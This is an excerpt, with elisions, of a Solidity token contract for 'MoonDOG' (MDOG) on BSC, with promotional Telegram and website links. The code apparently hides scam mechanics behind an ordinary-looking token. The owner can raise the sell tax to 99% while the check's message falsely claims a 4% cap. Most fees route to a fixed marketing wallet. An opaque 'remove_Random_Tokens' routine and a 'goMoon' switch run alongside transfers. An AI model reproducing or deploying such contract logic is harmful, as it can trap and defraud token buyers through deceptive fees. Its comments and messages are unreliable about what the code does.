...
/*      MoonDOG
            ...
            Telergam : https://t.me/MoondogBSC
            Webiste : https://moon-dog.xyz/
*/
...
contract MOONDOG is Context, IERC20 { 
    ...
    address payable public Marketing_Wallet = payable(0x164a02b0A23Dc1042c8956D5C0CB876f7B757FC8);
    ...
    string private constant _name = "MoonDOG"; 
    string private constant _symbol = unicode"MDOG";

    bool public GoMoon = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 3; 

    uint8 private txBuyBack = 0;
    uint8 private swapBuyback = 5; 

    uint256 public _Tax_On_Buy = 8;
    uint256 public _Tax_On_Sell = 8;

    uint256 private Percent_Marketing = 89;
    uint256 private Percent_Dev = 1;
    uint256 private Percent_Burn = 9;
    uint256 private Percent_AutoLP = 1; 

    uint256 public _maxWalletToken = _tTotal*3000;
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal*3000; 
    ...
    function goMoon() public virtual {
        require (_isExcludedFromMaxWallet[msg.sender], "Failed");

        GoMoon = true;
    }

       function setBuyMarketingFeePercent(uint256 updatedBuyMarketingFee) external onlyOwner {
        require(updatedBuyMarketingFee <= 10, "Buy fee should be less than 4%");
        _Tax_On_Buy = updatedBuyMarketingFee;
     
    }

    function setSellMarketingFeePercent(uint256 updatedSellMarketingFee) external onlyOwner {
        require(updatedSellMarketingFee <= 99, "Sell fee should be less than 4%");
        _Tax_On_Sell = updatedSellMarketingFee;
    ...
    function remove_Random_Tokens(uint256 tokens) internal {
        ...
        uint256 totalRandom = balanceOf(address(this));
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(txBuyBack >= swapBuyback){
            remove_Random_Tokens(_maxTxAmount);
        }
